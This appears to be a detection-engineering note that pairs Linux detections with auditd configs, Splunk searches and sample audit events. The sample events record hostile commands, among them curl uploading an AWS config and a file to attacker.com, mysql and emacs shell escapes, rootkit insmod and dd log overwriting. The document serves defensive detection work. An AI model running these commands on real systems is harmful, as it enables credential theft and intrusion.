type=EXECVE msg=audit(03/28/2023 13:02:10.222:4514) : argc=4 a0=curl a1=-F a2=userfile=@/root/.aws/config a3=http://example.com 
type=PATH msg=audit(03/28/2023 13:02:10.222:4514) : item=0 name=/usr/bin/curl inode=100854595 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/28/2023 13:02:10.222:4514) : proctitle=curl -F userfile=@/root/.aws/config http://example.com 
type=SYSCALL msg=audit(03/28/2023 13:00:53.022:4477) : arch=x86_64 syscall=execve success=yes exit=0 a0=0xf79e20 a1=0xf792d0 a2=0xf4bee0 a3=0x7ffc8d8e4da0 items=2 ppid=1448 pid=14448 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts1 ses=9 comm=curl exe=/usr/bin/curl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
type=EXECVE msg=audit(03/28/2023 13:00:53.022:4477) : argc=6 a0=curl a1=-X a2=POST a3=-d a4=@file_to_send a5=http://attacker.com/ 
type=PATH msg=audit(03/28/2023 13:00:53.022:4477) : item=0 name=/usr/bin/curl inode=100854595 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/28/2023 13:00:53.022:4477) : proctitle=curl -X POST -d @file_to_send http://attacker.com/ 
type=SYSCALL msg=audit(03/28/2023 13:00:41.337:4476) : arch=x86_64 syscall=execve success=yes exit=0 a0=0xf79940 a1=0xf79270 a2=0xf4bee0 a3=0x7ffc8d8e4da0 items=2 ppid=1448 pid=14447 auid=test-2 uid=test-2 gid=test-2 euid=test-2 suid=test-2 fsuid=test-2 egid=test-2 sgid=test-2 fsgid=test-2 tty=pts1 ses=9 comm=curl exe=/usr/bin/curl subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=susp_activity 
type=EXECVE msg=audit(03/28/2023 13:00:41.337:4476) : argc=5 a0=curl a1=-X a2=POST a3=-d a4=@ 
type=PATH msg=audit(03/28/2023 13:00:41.337:4476) : item=0 name=/usr/bin/curl inode=100854595 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/28/2023 13:00:41.337:4476) : proctitle=curl -X POST -d @ 
```  


### Linux Java Spawning Shell

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations: Not applicable  
Sample events:    

```
 
```

### Linux Deletion Of Services

Auditd config: ["-w /etc/systemd -p wa -k servicefiles", "-w /usr/lib/systemd -p wa -k systemdfiles", "-w /bin/systemctl -p x -k systemd"]
CIM Mapping: action, file_path, file_name, dest, process_guid
Search: No change required.  
Limitations:  
Sample events:    

```
type=PATH msg=audit(03/28/2023 12:48:02.751:4276) : item=1 name=/etc/systemd/test4.service inode=616118 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 12:48:00.322:4260) : item=1 name=/etc/systemd/test3.service inode=616117 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 12:47:58.292:4252) : item=1 name=/etc/systemd/test2.service inode=616116 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 12:47:55.851:4244) : item=1 name=/etc/systemd/test1.service inode=616115 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0
```



### Linux Iptables Firewall Modification

Datamodel: 
Auditd config:   
CIM Mapping: 
Search: PPID not available, and any part of command after &> so removed from query  

```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes
  where  Processes.process = "*iptables *" AND Processes.process = "* --dport *" AND Processes.process = "* ACCEPT*"  AND Processes.process = "* tcp *"
  by Processes.process_name Processes.process Processes.process_id Processes.parent_process_id Processes.process_guid Processes.dest _time span=10s
  Processes.user Processes.parent_process_name  Processes.parent_process_path Processes.process_path
  | rex field=Processes.process "--dport (?<port>3269|636|989|994|995|8443)"
  | stats values(Processes.process) as processes_exec values(port) as ports values(Processes.process_guid) as guids values(Processes.process_id) as pids dc(port) as port_count count 
  by Processes.process_name Processes.parent_process_name Processes.parent_process_id Processes.dest Processes.user Processes.parent_process_path Processes.process_path | where port_count >=3
  | `drop_dm_object_name(Processes)`
  | `security_content_ctime(firstTime)`
  | `security_content_ctime(lastTime)`
  | `linux_iptables_firewall_modification_filter`
```
Limitations:   
Sample events:    

```
type=PROCTITLE msg=audit(03/28/2023 10:16:05.118:1812) : proctitle=iptables -I OUTPUT -p tcp --dport 3269 -j ACCEPT 
type=USER_CMD msg=audit(03/28/2023 10:16:05.086:1809) : pid=3833 uid=test-2 auid=test-2 ses=9 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=iptables -I OUTPUT -p tcp --dport 3269 -j ACCEPT terminal=pts/1 res=success' 
type=PROCTITLE msg=audit(03/28/2023 10:10:19.445:1715) : proctitle=iptables -I OUTPUT -p tcp --dport 989 -j ACCEPT 
type=USER_CMD msg=audit(03/28/2023 10:10:19.380:1712) : pid=3440 uid=test-2 auid=test-2 ses=9 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=iptables -I OUTPUT -p tcp --dport 989 -j ACCEPT terminal=pts/1 res=success' 
type=PROCTITLE msg=audit(03/28/2023 10:10:12.384:1708) : proctitle=iptables -I OUTPUT -p tcp --dport 636 -j ACCEPT 
type=USER_CMD msg=audit(03/28/2023 10:10:12.332:1705) : pid=3437 uid=test-2 auid=test-2 ses=9 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=iptables -I OUTPUT -p tcp --dport 636 -j ACCEPT terminal=pts/1 res=success' 
type=USER_CMD msg=audit(03/28/2023 10:10:01.428:1689) : pid=3424 uid=test-2 auid=test-2 ses=9 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=sh -c iptables -I OUTPUT -p tcp --dport 636 -j ACCEPT terminal=pts/1 res=success' 
type=USER_CMD msg=audit(03/28/2023 10:09:40.895:1677) : pid=3414 uid=test-2 auid=test-2 ses=9 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=sh -c iptables -I OUTPUT -p tcp --dport 3269 -j ACCEPT terminal=pts/1 res=success' 
```  


### Linux File Creation In Init Boot Directory

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=PROCTITLE msg=audit(03/28/2023 10:03:25.627:1559) : proctitle=vi /etc/rc.local 
type=PROCTITLE msg=audit(03/28/2023 10:03:20.222:1558) : proctitle=vi /etc/rc.local 
type=PROCTITLE msg=audit(03/28/2023 10:03:20.222:1557) : proctitle=vi /etc/rc.local 
type=PATH msg=audit(03/28/2023 10:03:20.222:1556) : item=0 name=/etc/rc.d/ inode=100672588 dev=fd:00 mode=dir,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:etc_t:s0 objtype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 10:03:20.222:1556) : item=1 name=/etc/rc.d/.rc.local.swp objtype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/28/2023 10:03:20.222:1556) : proctitle=vi /etc/rc.local 
type=PATH msg=audit(03/28/2023 10:03:20.222:1555) : item=0 name=/etc/rc.d/ inode=100672588 dev=fd:00 mode=dir,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:etc_t:s0 objtype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 10:03:20.222:1555) : item=1 name=/etc/rc.d/.rc.local.swp objtype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/28/2023 10:03:20.222:1555) : proctitle=vi /etc/rc.local 
type=PATH msg=audit(03/28/2023 10:02:44.637:1544) : item=0 name=/etc/init.d/ inode=113353 dev=fd:00 mode=dir,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:etc_t:s0 objtype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 10:02:44.637:1544) : item=1 name=/etc/init.d/test inode=616099 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=unconfined_u:object_r:etc_t:s0 objtype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/28/2023 10:02:44.637:1544) : proctitle=touch /etc/init.d/test 
type=USER_CMD msg=audit(03/28/2023 10:02:44.579:1541) : pid=2931 uid=test-2 auid=test-2 ses=9 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=touch /etc/init.d/test terminal=pts/1 res=success' 
type=PATH msg=audit(03/28/2023 10:02:36.136:1538) : item=0 name=/etc/init.d/ inode=113353 dev=fd:00 mode=dir,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:etc_t:s0 objtype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 10:02:36.136:1538) : item=1 name=/etc/init.d/test objtype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/28/2023 10:02:36.136:1538) : proctitle=touch /etc/init.d/test 
type=EXECVE msg=audit(03/28/2023 10:01:04.492:1329) : argc=3 a0=chmod a1=0640 a2=/etc/audit/audit.rules 
type=PROCTITLE msg=audit(03/28/2023 10:01:04.492:1329) : proctitle=chmod 0640 /etc/audit/audit.rules 
type=PATH msg=audit(03/28/2023 10:00:48.731:1203) : item=0 name=/etc/docker/key.json inode=34565163 dev=fd:00 mode=file,600 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:container_config_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/28/2023 10:00:48.284:1189) : item=0 name=/etc/docker/seccomp.json inode=34565158 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:container_config_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
```  




### Linux Account Manipulation Of SSH Config and Keys

Datamodel: Process & Filsystem  
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```

```  



### Linux At Application Execution

Datamodel: Processes  
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=USER_ACCT msg=audit(03/28/2023 09:48:28.238:784) : pid=1612 uid=root auid=test-2 ses=9 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:accounting grantors=pam_access,pam_unix,pam_localuser acct=test-2 exe=/usr/bin/at hostname=? addr=? terminal=atd res=success' 
type=SYSCALL msg=audit(03/28/2023 09:48:28.232:783) : arch=x86_64 syscall=execve success=yes exit=0 a0=0xf78210 a1=0xf77ef0 a2=0xf4bee0 a3=0x7ffc8d8e4b20 items=2 ppid=1448 pid=1612 auid=test-2 uid=test-2 gid=test-2 euid=root suid=root fsuid=root egid=test-2 sgid=test-2 fsgid=test-2 tty=pts1 ses=9 comm=at exe=/usr/bin/at subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=at_susp 
type=EXECVE msg=audit(03/28/2023 09:48:28.232:783) : argc=4 a0=at a1=now a2=+5 a3=minutes 
type=PATH msg=audit(03/28/2023 09:48:28.232:783) : item=0 name=/usr/bin/at inode=101115755 dev=fd:00 mode=file,suid,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:crontab_exec_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/28/2023 09:48:28.232:783) : proctitle=at now +5 minutes 
type=USER_ACCT msg=audit(03/28/2023 09:48:25.128:782) : pid=1609 uid=root auid=test-2 ses=9 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:accounting grantors=pam_access,pam_unix,pam_localuser acct=test-2 exe=/usr/bin/at hostname=? addr=? terminal=atd res=success' 
type=SYSCALL msg=audit(03/28/2023 09:48:25.114:781) : arch=x86_64 syscall=execve success=yes exit=0 a0=0xf781f0 a1=0xf78080 a2=0xf4bee0 a3=0x7ffc8d8e4b20 items=2 ppid=1448 pid=1609 auid=test-2 uid=test-2 gid=test-2 euid=root suid=root fsuid=root egid=test-2 sgid=test-2 fsgid=test-2 tty=pts1 ses=9 comm=at exe=/usr/bin/at subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=at_susp 
type=EXECVE msg=audit(03/28/2023 09:48:25.114:781) : argc=4 a0=at a1=now a2=+5 a3=minutes 
type=PATH msg=audit(03/28/2023 09:48:25.114:781) : item=0 name=/usr/bin/at inode=101115755 dev=fd:00 mode=file,suid,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:crontab_exec_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/28/2023 09:48:25.114:781) : proctitle=at now +5 minutes 
type=USER_ACCT msg=audit(03/28/2023 09:47:43.878:772) : pid=1600 uid=root auid=test-2 ses=9 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=PAM:accounting grantors=pam_access,pam_unix,pam_localuser acct=test-2 exe=/usr/bin/at hostname=? addr=? terminal=atd res=success' 
type=SYSCALL msg=audit(03/28/2023 09:47:43.863:771) : arch=x86_64 syscall=execve success=yes exit=0 a0=0xf4c140 a1=0xf4c440 a2=0xf4bee0 a3=0x7ffc8d8e4da0 items=2 ppid=1448 pid=1600 auid=test-2 uid=test-2 gid=test-2 euid=root suid=root fsuid=root egid=test-2 sgid=test-2 fsgid=test-2 tty=pts1 ses=9 comm=at exe=/usr/bin/at subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=at_susp 
type=EXECVE msg=audit(03/28/2023 09:47:43.863:771) : argc=1 a0=at 
type=PATH msg=audit(03/28/2023 09:47:43.863:771) : item=0 name=/usr/bin/at inode=101115755 dev=fd:00 mode=file,suid,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:crontab_exec_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/28/2023 09:47:43.863:771) : proctitle=at 
```  


### Linux Docker Privilege Escalation

Datamodel: Processes  
Auditd config: Yes  
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=PROCTITLE msg=audit(03/24/2023 14:00:08.665:4736) : proctitle=/bin/sh /usr/bin/docker ps -aq -f status=dead 
type=PROCTITLE msg=audit(03/24/2023 14:00:08.665:4735) : proctitle=/bin/sh /usr/bin/docker ps -aq -f status=dead 
type=EXECVE msg=audit(03/24/2023 14:00:08.665:4734) : argc=6 a0=/bin/sh a1=/usr/bin/docker a2=ps a3=-aq a4=-f a5=status=dead 
type=PROCTITLE msg=audit(03/24/2023 14:00:08.665:4734) : proctitle=/bin/sh /usr/bin/docker ps -aq -f status=dead 
```  

### Linux Service Started Or Enabled

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```

```  


### Linux Insert Kernel Module Using Insmod Utility

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  

```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time)
  as lastTime from datamodel=Endpoint.Processes where Processes.process = *insmod* by Processes.dest Processes.user Processes.parent_process_name
  Processes.process_name Processes.process Processes.process_id Processes.parent_process_id
  Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
  | `security_content_ctime(lastTime)` | `linux_insert_kernel_module_using_insmod_utility_filter`
```

Limitations:   
Sample events:    

```
type=USER_CMD msg=audit(03/20/2023 13:59:04.622:8227) : pid=21159 uid=test-2 auid=test-2 ses=44 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=insmod rootkit.ko terminal=pts/0 res=success' 
type=USER_CMD msg=audit(03/20/2023 13:58:54.258:8208) : pid=21097 uid=test-2 auid=test-2 ses=44 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=insmod rootkit.ko terminal=pts/0 res=success' 
type=CONFIG_CHANGE msg=audit(03/20/2023 13:58:33.223:8202) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=add_rule key=insmod list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/20/2023 13:58:33.223:8127) : auid=unset ses=unset subj=system_u:system_r:unconfined_service_t:s0 op=remove_rule key=insmod list=exit res=yes 
type=CONFIG_CHANGE msg=audit(03/20/2023 13:58:30.032:8046) : auid=root ses=2 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 op=add_rule key=insmod list=exit res=yes 
type=USER_CMD msg=audit(03/20/2023 13:57:07.258:7883) : pid=20908 uid=test-2 auid=test-2 ses=44 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=insmod rootkit.ko terminal=pts/0 res=success' 
```  


### Linux Edit Cron Table Parameter

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=SYSCALL msg=audit(03/20/2023 13:51:33.171:7491) : arch=x86_64 syscall=unlink success=yes exit=0 a0=0x55aa7cfc42e0 a1=0x7ffe5ad48790 a2=0x0 a3=0x8 items=2 ppid=12751 pid=20445 auid=test-2 uid=test-2 gid=test-2 euid=root suid=root fsuid=root egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=44 comm=crontab exe=/usr/bin/crontab subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=delete 
type=PATH msg=audit(03/20/2023 13:51:33.171:7491) : item=1 name=/tmp/crontab.GXI6X7 inode=35326438 dev=fd:00 mode=file,600 ouid=test-2 ogid=test-2 rdev=00:00 obj=unconfined_u:object_r:user_tmp_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/20/2023 13:51:33.171:7491) : proctitle=crontab -e 
type=SYSCALL msg=audit(03/20/2023 13:51:33.171:7490) : arch=x86_64 syscall=rename success=yes exit=0 a0=0x55aa7cfc32e0 a1=0x7ffe5ad48a30 a2=0x7ffe5ad48a46 a3=0x2 items=4 ppid=12751 pid=20445 auid=test-2 uid=test-2 gid=test-2 euid=root suid=root fsuid=root egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=44 comm=crontab exe=/usr/bin/crontab subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=cron 
type=PROCTITLE msg=audit(03/20/2023 13:51:33.171:7490) : proctitle=crontab -e 
type=SYSCALL msg=audit(03/20/2023 13:51:33.171:7489) : arch=x86_64 syscall=fchown success=yes exit=0 a0=0x5 a1=0x3e9 a2=0xffffffff a3=0x2 items=1 ppid=12751 pid=20445 auid=test-2 uid=test-2 gid=test-2 euid=root suid=root fsuid=root egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=44 comm=crontab exe=/usr/bin/crontab subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=cron 
type=PROCTITLE msg=audit(03/20/2023 13:51:33.171:7489) : proctitle=crontab -e 
type=SYSCALL msg=audit(03/20/2023 13:51:33.171:7488) : arch=x86_64 syscall=open success=yes exit=5 a0=0x55aa7cfc32e0 a1=O_RDWR|O_CREAT|O_EXCL a2=0600 a3=0x0 items=2 ppid=12751 pid=20445 auid=test-2 uid=test-2 gid=test-2 euid=root suid=root fsuid=root egid=test-2 sgid=test-2 fsgid=test-2 tty=pts0 ses=44 comm=crontab exe=/usr/bin/crontab subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=cron 
type=PROCTITLE msg=audit(03/20/2023 13:51:33.171:7488) : proctitle=crontab -e 
type=PATH msg=audit(03/20/2023 13:51:33.171:7487) : item=1 name=/tmp/.crontab.GXI6X7.swp inode=35326441 dev=fd:00 mode=file,600 ouid=test-2 ogid=test-2 rdev=00:00 obj=unconfined_u:object_r:user_tmp_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/20/2023 13:51:33.171:7487) : proctitle=/usr/bin/vi /tmp/crontab.GXI6X7 
type=PATH msg=audit(03/20/2023 13:51:33.137:7486) : item=0 name=/tmp/crontab.GXI6X7 inode=35326438 dev=fd:00 mode=file,600 ouid=test-2 ogid=test-2 rdev=00:00 obj=unconfined_u:object_r:user_tmp_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/20/2023 13:51:33.137:7486) : proctitle=/usr/bin/vi /tmp/crontab.GXI6X7 
type=PATH msg=audit(03/20/2023 13:51:23.978:7485) : item=0 name=/tmp/.crontab.GXI6X7.swp inode=35326441 dev=fd:00 mode=file,600 ouid=test-2 ogid=test-2 rdev=00:00 obj=unconfined_u:object_r:user_tmp_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
```  




### Linux Possible Cronjob Modification With Editor

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=PATH msg=audit(03/20/2023 13:49:00.656:7433) : item=1 name=/etc/crontab~ inode=33563203 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:system_cron_spool_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=SYSCALL msg=audit(03/20/2023 13:49:00.656:7432) : arch=x86_64 syscall=setxattr success=yes exit=0 a0=0x16f9730 a1=0x7f6333d4ce2f a2=0x1717db0 a3=0x1c items=1 ppid=20243 pid=20247 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=44 comm=vi exe=/usr/bin/vi subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=cron 
type=PATH msg=audit(03/20/2023 13:49:00.656:7432) : item=0 name=/etc/crontab inode=35326439 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:system_cron_spool_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=SYSCALL msg=audit(03/20/2023 13:49:00.656:7431) : arch=x86_64 syscall=chmod success=yes exit=0 a0=0x16f9730 a1=0644 a2=0x0 a3=0x29 items=1 ppid=20243 pid=20247 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=44 comm=vi exe=/usr/bin/vi subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=cron 
type=PATH msg=audit(03/20/2023 13:49:00.656:7431) : item=0 name=/etc/crontab inode=35326439 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:system_cron_spool_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=SYSCALL msg=audit(03/20/2023 13:49:00.656:7430) : arch=x86_64 syscall=setxattr success=yes exit=0 a0=0x16f9730 a1=0x7f6334196f6a a2=0x171b010 a3=0x29 items=1 ppid=20243 pid=20247 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=44 comm=vi exe=/usr/bin/vi subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=cron 
type=SYSCALL msg=audit(03/20/2023 13:49:00.647:7429) : arch=x86_64 syscall=open success=yes exit=3 a0=0x16f9730 a1=O_WRONLY|O_CREAT|O_TRUNC a2=0644 a3=0x0 items=2 ppid=20243 pid=20247 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=44 comm=vi exe=/usr/bin/vi subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=cron 
type=SYSCALL msg=audit(03/20/2023 13:49:00.647:7428) : arch=x86_64 syscall=rename success=yes exit=0 a0=0x16f9730 a1=0x171c440 a2=0xfffffffffffffe80 a3=0x7ffcefd27b20 items=4 ppid=20243 pid=20247 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=44 comm=vi exe=/usr/bin/vi subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=cron 
type=PATH msg=audit(03/20/2023 13:49:00.647:7428) : item=2 name=/etc/crontab inode=33563203 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:system_cron_spool_t:s0 objtype=DELETE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(03/20/2023 13:49:00.647:7428) : item=3 name=/etc/crontab~ inode=33563203 dev=fd:00 mode=file,644 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:system_cron_spool_t:s0 objtype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
``` 


### Linux Possible Append Command To Profile Config File

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations: echo is an in-built so not available    
Sample events:    

```

```  




### Linux Decode Base64 to Shell

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations: covered by other base64 search, commands with | come through as separate events   
Sample events:    

```

```  




### Linux MySQL Privilege Escalation

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time)
  as lastTime from datamodel=Endpoint.Processes where Processes.process="*mysql*-e*" AND Processes.process="*\!**" by Processes.dest Processes.user Processes.parent_process_name
  Processes.process_name Processes.process Processes.process_id Processes.parent_process_id
  Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
  | `security_content_ctime(lastTime)` | `linux_mysql_privilege_escalation_filter`
```
Limitations:   
Sample events:    

```
type=USER_CMD msg=audit(03/20/2023 13:11:53.671:6098) : pid=17699 uid=test-2 auid=test-2 ses=44 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=mysql -e ! /bin/sh terminal=pts/0 res=failed' 
```  



### Linux Emacs Privilege Escalation

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  

```
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) 
  as lastTime from datamodel=Endpoint.Processes where Processes.process="*emacs*" AND Processes.process="*--eval*"  by Processes.dest Processes.user Processes.parent_process_name
  Processes.process_name Processes.process Processes.process_id Processes.parent_process_id
  Processes.process_guid | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)`
  | `security_content_ctime(lastTime)` | `linux_emacs_privilege_escalation_filter`
```
Limitations:   
Sample events:    

```
type=USER_CMD msg=audit(03/20/2023 13:08:39.005:6068) : pid=17502 uid=test-2 auid=test-2 ses=44 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='cwd=/home/test-2 cmd=emacs --eval (term /bin/sh) terminal=pts/0 res=success' 
```  



### Linux DD File Overwrite

Datamodel: 
Auditd config:   
CIM Mapping: 
Search:  
Limitations:   
Sample events:    

```
type=SYSCALL msg=audit(03/20/2023 12:58:44.051:5560) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x55fe154e7248 a1=0x55fe154f9198 a2=0x55fe1550def0 a3=0x0 items=2 ppid=16567 pid=16571 auid=test-2 uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts0 ses=44 comm=dd exe=/usr/bin/dd subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=dd_overwrite 
type=EXECVE msg=audit(03/20/2023 12:58:44.051:5560) : argc=5 a0=dd a1=of=/dev/zero a2=if=/var/log/syslog a3=count= a4=iflag=count_bytes 
type=PATH msg=audit(03/20/2023 12:58:44.051:5560) : item=0 name=/bin/dd inode=100817946 dev=fd:00 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:bin_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PROCTITLE msg=audit(03/20/2023 12:58:44.051:5560) : proctitle=dd of=/dev/zero if=/var/log/syslog count= iflag=count_bytes 
